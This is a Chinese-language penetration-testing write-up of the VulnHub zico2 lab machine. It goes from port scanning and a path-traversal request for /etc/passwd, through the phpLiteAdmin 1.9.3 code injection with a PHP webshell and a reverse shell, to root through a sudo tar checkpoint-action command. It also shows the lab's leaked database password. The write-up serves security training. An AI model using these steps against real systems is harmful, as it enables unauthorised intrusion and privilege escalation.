# VulnHub - zico2 靶机渗透测试

## 一、靶机信息

| 项目           | 信息                                       |
| -------------- | ------------------------------------------ |
| 靶机 IP        | `172.20.10.3`                              |
| 开放端口       | `22/tcp`、`80/tcp`、`111/tcp`、`51970/tcp` |
| Web 服务       | HTTP                                       |
| 数据库管理工具 | phpLiteAdmin                               |
| 版本           | 1.9.3                                      |
| 核心漏洞       | 文件包含、PHP 代码注入                     |
| 提权方式       | sudo tar 提权                              |
| 最终目标       | 获取 root 权限                             |

## 二、信息收集

### 1. 主机发现与端口扫描

确认靶机 IP：

```
172.20.10.3
```

使用 Nmap 扫描开放端口：

```
nmap -sV -sC 172.20.10.3
```

扫描结果：

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
51970/tcp open  unknown
```

发现 SSH、HTTP、RPC 等服务。

其中 80 端口提供 Web 服务，是本次主要的攻击入口。

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

<img src=".\images\02.png" alt="01" style="zoom:33%;" />



## 三、Web 信息收集与文件包含

### 1. 查看页面源码

浏览 Web 页面，发现以下链接：

```
<a href="/view.php?page=tools.html"
   class="btn btn-default btn-xl sr-button">
   Check them out!
</a>
```

发现页面通过 `view.php` 的 `page` 参数加载不同页面。

初步怀疑存在文件包含漏洞。

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

### 2. 测试目录遍历

构造路径遍历请求：

```
http://172.20.10.3/view.php?page=../../../../etc/passwd
```

通过 `../` 尝试跳出当前目录，访问 Linux 系统文件。

如果页面成功返回 `/etc/passwd` 内容，说明存在本地文件读取或文件包含风险。

**知识点：**

- `../`：返回上一级目录。
- `/etc/passwd`：Linux 用户账户信息文件。
- LFI（Local File Inclusion）：本地文件包含漏洞。
- 路径遍历（Path Traversal）：通过构造路径访问预期目录之外的文件。

注意：能够读取文件不一定代表能够执行 PHP 代码，需要根据页面的实际处理逻辑进一步判断。

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

## 四、CMS 与组件信息收集

### 1. 发现 phpLiteAdmin

进一步对 Web 页面进行信息收集，发现数据库管理工具：

```
phpLiteAdmin v1.9.3
```

phpLiteAdmin 是一款基于 PHP 的 SQLite 数据库管理工具。

### 2. 搜索公开漏洞

使用 Searchsploit 搜索对应版本的公开漏洞：

```
searchsploit phpLiteAdmin
```

发现：

```
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
php/webapps/24044.txt
```

漏洞名称：

```
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
```

漏洞思路：

phpLiteAdmin 1.9.3 存在与 PHP 代码注入相关的安全问题。在具备管理权限的情况下，可以利用数据库文件创建和处理机制，构造特殊内容，进一步实现 PHP 代码执行。

<img src=".\images\06.png" alt="01" style="zoom:33%;" />

## 五、phpLiteAdmin 弱口令爆破与 PHP 代码注入

### 1. 爆破管理后台密码

访问 phpLiteAdmin 管理页面，发现需要输入密码才能进入。

通过字典爆破获得后台密码。

成功登录 phpLiteAdmin 后，获得数据库管理权限。

### 2. 创建数据库

登录后创建新的 SQLite 数据库。

结合 Searchsploit 中的漏洞利用说明，利用 phpLiteAdmin 1.9.3 的 PHP 代码注入问题，将 PHP 代码写入可被 Web 服务解析的位置。

本次利用过程中，创建数据库时使用了默认值形式的一句话木马。

### 3. 获取 Shell

通过访问构造好的 PHP 文件，验证代码执行情况。

成功执行系统命令后，进一步建立反弹 Shell，获取目标服务器的初始 Shell。

至此，从 Web 入口成功进入目标 Linux 系统。

## 六、获取数据库配置凭据

获得 Shell 后，继续进行服务器文件信息收集。

在网站配置文件中发现数据库连接配置：

```
/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
```

获取到：

```
DB_USER: zico
DB_PASSWORD: sWfCsfJSPV9H3AmQzw8
```

**知识点：**

网站配置文件通常包含数据库连接信息，例如：

- 数据库用户名
- 数据库密码
- 数据库地址
- 数据库名称

配置文件泄露可能导致数据库未授权访问，也可能为后续横向利用提供凭据。

注意：获取到数据库凭据不代表一定能够直接通过 SSH 登录，需要进一步验证账号和密码是否复用。

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

<img src=".\images\08.png" alt="01" style="zoom:33%;" />

<img src=".\images\09.png" alt="01" style="zoom:33%;" />

## 七、Linux 权限信息收集

### 1. 查看 sudo 权限

进入目标服务器后执行：

```
sudo -l
```

该命令用于查看当前用户可以通过 sudo 执行哪些命令。

本次发现目标用户具有 tar 相关的 sudo 执行权限。

这意味着可以尝试利用 tar 的特殊参数实现权限提升。

## 八、Linux sudo tar 提权

### 1. 漏洞原理

`tar` 是 Linux 系统中常见的归档工具。

其 checkpoint 机制可以在归档过程中执行指定操作。

其中：

- `--checkpoint=1`：每处理一个 checkpoint 就触发一次检查点操作。
- `--checkpoint-action=exec=COMMAND`：在 checkpoint 触发时执行指定命令。

如果当前用户能够以 root 权限执行 tar，并且没有限制这些参数，就可能利用该机制执行高权限命令。

### 2. 执行提权命令

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

参数说明：

| 参数                               | 作用                         |
| ---------------------------------- | ---------------------------- |
| `sudo`                             | 以 sudo 授权的高权限执行命令 |
| `tar`                              | 调用归档工具                 |
| `-c`                               | 创建归档                     |
| `-f /dev/null`                     | 将归档输出到 `/dev/null`     |
| `--checkpoint=1`                   | 设置 checkpoint 间隔         |
| `--checkpoint-action=exec=/bin/sh` | 触发 checkpoint 时执行 Shell |

### 3. 验证提权结果

执行：

```
whoami
```

查看当前用户。

再执行：

```
id
```

确认当前权限。

最终成功获得 root 权限。

<badge color="success">Root 提权成功</badge>

<img src=".\images\10.png" alt="01" style="zoom:33%;" />

<img src=".\images\11.png" alt="01" style="zoom:33%;" />

## 九、完整渗透流程

```
主机发现
    ↓
Nmap 端口扫描
    ↓
发现 22、80、111、51970 端口
    ↓
Web 页面信息收集
    ↓
发现 view.php?page 参数
    ↓
测试目录遍历 / 本地文件读取
    ↓
发现 phpLiteAdmin 1.9.3
    ↓
Searchsploit 搜索公开漏洞
    ↓
发现 PHP Code Injection
    ↓
爆破 phpLiteAdmin 管理密码
    ↓
登录数据库管理后台
    ↓
创建数据库并利用 PHP 代码注入
    ↓
获取初始 Shell
    ↓
读取网站配置文件
    ↓
发现数据库连接凭据
    ↓
sudo -l 查看权限
    ↓
发现 tar 可 sudo 执行
    ↓
利用 tar checkpoint-action 执行 Shell
    ↓
获取 root 权限
```

## 十、本次实战收获

1. **目录遍历与文件包含：** 学会通过分析 URL 参数发现潜在文件读取入口，理解 `../` 路径遍历的基本原理。
2. **Web 组件指纹识别：** 通过 phpLiteAdmin 版本信息，结合 Searchsploit 搜索公开漏洞。
3. **弱口令爆破：** 理解管理后台弱口令可能成为 Web 渗透的突破口。
4. **PHP 代码注入：** 认识数据库管理工具的文件处理功能可能被滥用，最终导致服务器端代码执行。
5. **敏感配置文件收集：** 学会从网站配置文件中寻找数据库账号和密码等敏感信息。
6. **Linux sudo 权限枚举：** 掌握使用 `sudo -l` 检查当前用户的特殊执行权限。
7. **tar 提权：** 理解 tar checkpoint 机制及其在 sudo 配置不当时造成的权限提升风险。

## 十一、涉及工具与技术

| 工具 / 技术    | 主要用途                 |
| -------------- | ------------------------ |
| Nmap           | 主机与端口扫描           |
| Searchsploit   | 搜索公开漏洞             |
| phpLiteAdmin   | SQLite 数据库管理        |
| 字典爆破       | 获取后台访问密码         |
| PHP 一句话木马 | 验证 PHP 代码执行        |
| 反弹 Shell     | 获取交互式命令行         |
| sudo -l        | 枚举 sudo 权限           |
| tar            | 利用 checkpoint 机制提权 |